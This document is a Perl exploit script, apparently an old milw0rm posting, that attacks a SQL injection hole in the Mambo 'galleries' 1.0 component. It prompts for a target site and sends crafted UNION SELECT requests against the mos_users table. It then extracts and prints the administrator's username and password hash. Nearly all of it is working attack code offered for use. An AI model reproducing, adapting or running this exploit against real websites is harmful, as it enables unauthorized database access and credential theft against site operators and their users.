#!/usr/bin/perl -w

#   Mambo Component galleries v 1.0  Remote SQL Injection #
########################################
#[*] Found by : Houssamix From H-T Team 
#[*] H-T Team [ HouSSaMix + ToXiC350 ] 
#[*] Greetz : bugtr4cker & Stack & HaCkeR_EgY  & Hak3r-b0y & All friends & All muslims HaCkeRs  :) 
#[*] Script_Name: "Mambo"
#[*] Component_Name:  galleries v 1.0
########################################
# <mosinstall type="component">
# <name>galleries</name>
#<creationDate>10/04/2006</creationDate>
#<author>Vinay Kr. Singh</author>
#<copyright>This component is released under the GNU License</copyright>
#<authorEmail>vinay.singh@yahoo.com</authorEmail>
#<authorUrl>www.opensource.com</authorUrl>
#<version>1.0</version>


system("color f");
print "\t\t########################################################\n\n";
print "\t\t#                        Viva Islam                    #\n\n";
print "\t\t########################################################\n\n";
print "\t\t# Mambo Component galleries 1.0  Remote SQL Injection  #\n\n";
print "\t\t# H-T Team [HouSSaMiX - ToXiC350]	            	  #\n\n";
print "\t\t########################################################\n\n";

use LWP::UserAgent;

print "\nEnter your Target (http://site.com/mambo/): ";
	chomp(my $target=<STDIN>);

$uname="username";
$passwd="password";
$magic="mos_users";

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$host = $target . "/index.php?option=com_galleries&id=10&aid=-1%20union%20select%201,2,3,concat(CHAR(60,117,115,101,114,62),".$uname.",CHAR(60,117,115,101,114,62))from/**/".$magic."/**";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;

print "\n[+] The Target : ".$target."";

if ($answer =~ /<user>(.*?)<user>/){
       
		print "\n[+] Admin User : $1";
}
$host2 = $target . "index.php?option=com_galleries&id=10&aid=-1%20union%20select%201,2,3,".$passwd."/**/from/**/".$magic."/**";
$res2 = $b->request(HTTP::Request->new(GET=>$host2));
$answer = $res2->content;
if ($answer =~/([0-9a-fA-F]{32})/){
		print "\n[+] Admin Hash : $1\n\n";
		print "#   Exploit succeed!  #\n\n";
}
else{print "\n[-] Exploit Failed...\n";
}

# codec  by Houssamix From H-T Team

# milw0rm.com [2008-06-13]
